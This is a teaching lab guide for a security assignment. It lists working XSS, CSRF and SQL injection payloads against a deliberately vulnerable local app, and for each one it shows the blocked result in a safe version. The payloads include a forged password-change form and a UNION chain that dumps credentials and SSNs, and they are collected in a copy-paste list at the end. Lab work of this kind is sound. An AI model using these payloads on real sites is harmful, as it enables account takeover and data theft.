# Flex — Attack Playbook & Screenshot Guide

This file lists **every payload** that works in the **Vulnerable Version**, exactly
in the order of the assignment's evidence table. For each one it tells you:

- where to enter it,
- the payload to paste,
- what you should see (take a **screenshot** here), and
- what happens in the **Safe Version** (take the "now blocked" screenshot).

> Start the vulnerable app first: `npm run vulnerable`, then open
> <http://localhost:3000> and log in as **abdullah / 1234** (unless a step says
> otherwise). Confirm the selected mode in the server terminal.
>
> For the "blocked" screenshots, stop the server, run `npm run safe`, and repeat
> the same step.

All payloads below were tested and confirmed working.

---

## 1. XSS — Reflected  `PAYLOAD + SCREENSHOT`

**Where:** Course Search page (`/search`), in the search box — or straight in the URL.

**Payload (paste into the search box):**
```
<script>alert('Reflected-XSS')</script>
```
Or open this URL directly:
```
http://localhost:3000/search?q=<script>alert('Reflected-XSS')</script>
```

**Vulnerable result:** a JavaScript alert box pops up saying `Reflected-XSS`. The
script came straight from the URL and was reflected into the page unescaped.
📸 *Screenshot the alert box.*

**Also try (image-based, fires without `<script>`):**
```
<img src=x onerror=alert('Reflected-XSS')>
```

**Safe version:** no alert. The page shows the payload as literal text
(`<script>alert('Reflected-XSS')</script>`) because it is HTML-escaped.
📸 *Screenshot the escaped text / no alert.*

---

## 2. XSS — Stored  `PAYLOAD + SCREENSHOT`

**Where:** Class Wall page (`/wall`), in the "New post" box.

**Payload (type into the post box, then click "Post to wall"):**
```
<script>alert('Stored-XSS')</script>
```
Or, to prove it fires on load for *everyone*:
```
<img src=x onerror=alert('Stored-XSS-fires-for-all-viewers')>
```

**Vulnerable result:** after posting, the wall reloads and the alert fires. The
payload is now **saved in the database** — every user who opens `/wall` will have
it execute in their browser. Log in as a different user (e.g. `ayesha`) and open
the wall to prove it affects other people.
📸 *Screenshot the alert (ideally as a second user).*

**Safe version:** the post is saved but displayed as harmless text; no alert.
📸 *Screenshot the escaped post.*

---

## 3. XSS — DOM-based  `PAYLOAD + SCREENSHOT`

**Where:** Welcome Board page (`/welcome`). The vulnerability is purely in
client-side JavaScript that reads the URL fragment (`location.hash`) — the server
never sees the payload.

**Payload (paste into the browser address bar and press Enter):**
```
http://localhost:3000/welcome#<img src=x onerror=alert('DOM-XSS')>
```

**Vulnerable result:** the alert `DOM-XSS` fires. The client script wrote the
fragment into the page using `innerHTML`.
📸 *Screenshot the alert.*

> Note: everything after `#` never reaches the server, which is the whole point of
> DOM-based XSS. You can confirm this in the server console — no payload is logged.

**Safe version:** the script uses `textContent` instead of `innerHTML`, so the
payload is shown as text and no alert fires.
📸 *Screenshot the escaped text / no alert.*

---

## 4. CSRF  `ATTACK SETUP + PAYLOAD + SCREENSHOT`

**Genuine state-changing action:** changing the account password (`/change-password`).

### Attack setup
1. Start the Flex app (vulnerable): `npm run vulnerable`
2. In a **second terminal**, start the attacker site: `npm run attacker`
   (it runs on **http://localhost:4000** — a different origin, which is what makes
   it a real cross-site request).
3. In your browser, **log into Flex** as `abdullah / 1234`.
4. In the **same browser**, open the attacker page:
   ```
   http://localhost:4000
   ```

**The payload** (this is what the attacker page auto-submits — see
`attacker/csrf-change-password.html`):
```html
<form action="http://localhost:3000/change-password" method="POST">
  <input type="hidden" name="newPassword" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

**Vulnerable result:** the attacker page ("Win a Free Laptop") silently sends the
password-change request using your logged-in Flex cookie. Flex changes Abdullah's
password to `hacked123` **without consent**. Prove it: log out and log back in with
`abdullah / hacked123` — it works.
📸 *Screenshot the "Password changed" page, or the successful login with the new password.*

**Safe version:** repeat the exact same steps with `npm run safe`. Flex returns
**403 — CSRF validation failed** because the forged request has no valid CSRF
token (and the `SameSite` cookie is not sent cross-site). The password is unchanged.
📸 *Screenshot the 403 "CSRF validation failed" page.*

> To reset Abdullah's password after the demo: `npm run reset-db`.

---

## 5. SQL Injection — Easy  `PAYLOAD + SCREENSHOT`

**Where:** Login form (`/login`). Log out first so you see the login page.

**Payload — bypass login as admin (username field):**
```
admin' --
```
Password field: type **anything** (e.g. `x`).

**Vulnerable result:** you are logged in as **System Administrator (admin)** without
knowing the password. The `--` comments out the password check.
📸 *Screenshot the admin dashboard ("Signed in as System Administrator (admin)").*

**Alternative easy payload (classic OR):**
- Username: `' OR '1'='1' --`
- Password: `x`

**Safe version:** login fails with "Invalid username or password." The query is
parameterised, so the input is treated as data, not SQL.
📸 *Screenshot the failed login.*

---

## 6. SQL Injection — Intermediate  `PAYLOAD + SCREENSHOT`

**Where:** Course Search (`/search`). This is **blind boolean inference** — you
don't see data directly, you infer TRUE vs FALSE from whether results appear.

> Note the trailing `-- ` (dash-dash-space). It comments out the query's own
> closing `%'`, so your injected condition is what decides the result.

**TRUE payload (condition always true → returns ALL courses):**
```
%' OR '1'='1' -- 
```

**FALSE payload (condition always false → returns NOTHING):**
```
%' AND '1'='2' -- 
```

**Vulnerable result:** the TRUE payload lists every course in the catalogue; the
FALSE payload shows "No courses matched." The difference between the two responses
is what an attacker uses to extract data one bit at a time.
📸 *Screenshot both: the full list (TRUE) and the empty result (FALSE), side by side.*

**Error-based variant (optional, also works):** a broken quote makes the DB return
an error message, confirming injection:
```
'
```
📸 *Screenshot the "SQL error: ..." message.*

**Safe version:** both payloads are treated as a literal search string, so they
simply return "No courses matched" and never change the query logic.
📸 *Screenshot the harmless no-match result.*

---

## 7. SQL Injection — Advanced  `PAYLOADS + SCREENSHOTS FOR EACH STAGE`

**Where:** Course Search (`/search`). A full structured UNION attack chain. Paste
each payload into the search box in order and screenshot each stage.

### Stage 1 — Find the number of columns
```
x' ORDER BY 4 -- 
```
→ works (no error).
```
x' ORDER BY 5 -- 
```
→ errors: *"1st ORDER BY term out of range - should be between 1 and 4"*.
**Conclusion: the query has 4 columns.**
📸 *Screenshot the ORDER BY 5 error.*

### Stage 2 — Enumerate the tables
(SQLite's equivalent of `information_schema` is `sqlite_master`.)
```
x' UNION SELECT name, type, 3, 4 FROM sqlite_master WHERE type='table' -- 
```
→ reveals the table names: `users`, `courses`, `grades`, `enrollments`, `wall_posts`.
📸 *Screenshot the table list.*

### Stage 3 — Enumerate the columns of the `users` table
```
x' UNION SELECT sql, '2', '3', '4' FROM sqlite_master WHERE name='users' -- 
```
→ returns the `CREATE TABLE users (...)` definition, exposing the column names:
`id, username, password, full_name, role, email, secret_ssn`.
📸 *Screenshot the CREATE TABLE text.*

### Stage 4 — Extract the sensitive data
```
x' UNION SELECT username, password, role, secret_ssn FROM users -- 
```
→ dumps every user's **username, plaintext password, role, and secret SSN**,
including `admin / SuperSecret@123`.
📸 *Screenshot the dumped credentials table.*

**Safe version:** repeat each stage with `npm run safe`. Every payload is treated as
a literal course-title search — no errors, no table names, no credentials. Only
normal course results (or no match) are ever returned.
📸 *Screenshot a Stage-4 attempt returning no credentials.*

---

## Safe Version — Summary of "now fails" screenshots

For the final evidence box, capture the **green SAFE banner** and each attack
failing:

| Attack | Safe-version screenshot to capture |
|--------|-----------------------------------|
| Reflected XSS | payload shown as text, no alert |
| Stored XSS | wall post shown as text, no alert |
| DOM XSS | fragment shown as text, no alert |
| CSRF | 403 "CSRF validation failed" |
| SQLi Easy | "Invalid username or password" |
| SQLi Intermediate | "No courses matched" for both payloads |
| SQLi Advanced | Stage 4 returns no credentials |

---

## Quick copy-paste payload list

```
# Reflected XSS
<script>alert('Reflected-XSS')</script>

# Stored XSS
<img src=x onerror=alert('Stored-XSS-fires-for-all-viewers')>

# DOM XSS  (in the address bar)
http://localhost:3000/welcome#<img src=x onerror=alert('DOM-XSS')>

# CSRF  (open while logged in)
http://localhost:4000

# SQLi Easy  (username field, any password)
admin' --

# SQLi Intermediate  (search box)  — note trailing dash-dash-space
%' OR '1'='1' -- 
%' AND '1'='2' -- 

# SQLi Advanced  (search box, in order)
x' ORDER BY 4 -- 
x' ORDER BY 5 -- 
x' UNION SELECT name, type, 3, 4 FROM sqlite_master WHERE type='table' -- 
x' UNION SELECT sql, '2', '3', '4' FROM sqlite_master WHERE name='users' -- 
x' UNION SELECT username, password, role, secret_ssn FROM users -- 
```
